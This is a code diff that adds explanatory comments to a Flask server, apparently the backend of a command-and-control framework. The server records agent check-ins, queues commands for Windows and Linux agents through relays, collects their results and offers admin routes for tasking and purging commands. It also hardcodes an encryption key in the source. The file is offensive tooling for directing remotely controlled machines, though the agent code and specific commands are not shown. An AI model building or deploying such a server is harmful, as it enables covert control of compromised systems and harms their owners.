@@ -7,15 +7,19 @@ import json
 import uuid
 import os
 
+# Working Directory Setup
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'), static_folder=BASE_DIR)
 
+# Encryption Setup
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
 cipher = Fernet(SECRET_KEY)
+
 DB_FILE = os.path.join(BASE_DIR, 'c2.db')
 TARGET_BROADCASTS = {"ALL", "BROADCAST_WINDOWS", "BROADCAST_LINUX"}
 
 
+# Initialize database and tables.
 def query_db(query, args=(), one=False):
     conn = sqlite3.connect(DB_FILE)
     conn.row_factory = sqlite3.Row
@@ -39,10 +43,10 @@ def init_db():
     query_db('''CREATE TABLE IF NOT EXISTS task_receipts
                 (task_id INTEGER, hostname TEXT)''')
 
-
+# Command to publish database
 init_db()
 
-
+# Defines how to determine an OS as Windows or Linux
 def normalize_os_family(os_name):
     text = (os_name or "").lower()
     if "win" in text:
@@ -53,7 +57,7 @@ def normalize_os_family(os_name):
         return "MAC"
     return "UNKNOWN"
 
-
+# Determines when an agent should be considered online, offline, stale, or unknown for its status.
 def parse_status(last_seen, now):
     try:
         last_dt = datetime.combine(now.date(), datetime.strptime(last_seen, '%H:%M:%S').time())
@@ -66,11 +70,10 @@ def parse_status(last_seen, now):
     except ValueError:
         return "UNKNOWN"
 
-
 def status_weight(status):
     return {"ONLINE": 3, "STALE": 2, "OFFLINE": 1, "UNKNOWN": 0}.get(status, 0)
 
-
+# Routes defined for the API for the backend user interface. Refer to index.html file.
 @app.route('/')
 def dashboard():
     template_path = os.path.join(BASE_DIR, 'templates', 'index.html')
@@ -78,7 +81,7 @@ def dashboard():
         return render_template('index.html')
     return send_from_directory(BASE_DIR, 'index.html')
 
-
+# Hearbeat (or check in) for alive signal from agents
 @app.route('/checkin', methods=['POST'])
 def checkin():
     try:
@@ -111,7 +114,7 @@ def checkin():
     except Exception:
         return "Error", 400
 
-
+# Collects statistics and metrics to place onto the dashboard for better understanding of the current agents up/down status.
 @app.route('/api/stats')
 def api_stats():
     now = datetime.now()
@@ -231,7 +234,7 @@ def api_stats():
         }
     })
 
-
+# Handles results from command that are being send from the relays. Inserts results into database for the frontend UI.
 @app.route('/result', methods=['POST'])
 def get_result():
     try:
@@ -252,7 +255,7 @@ def get_result():
         print(f"Result Error: {e}")
         return "Error", 400
 
-
+# Route used to send commands to relays which is then distributed to the agents.
 @app.route('/admin/send_cmd', methods=['POST'])
 def send_command():
     target = request.form.get('target')
@@ -267,14 +270,14 @@ def send_command():
     )
     return "OK", 200
 
-
+# Route made to clear out the command queue if it ever becomes stuck or if a command is sent on accident.
 @app.route('/admin/purge_tasks', methods=['POST'])
 def purge_tasks():
     query_db("DELETE FROM tasks")
     query_db("DELETE FROM task_receipts")
     return "OK", 200
 
-
+# Quick commands defined on the dashboard
 @app.route('/admin/action', methods=['POST'])
 def agent_action():
     hostname = request.form.get('hostname')
@@ -303,6 +306,6 @@ def agent_action():
     )
     return jsonify({"status": "Tasked"}), 200
 
-
+# Run flask server on all interfaces over port 5000
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
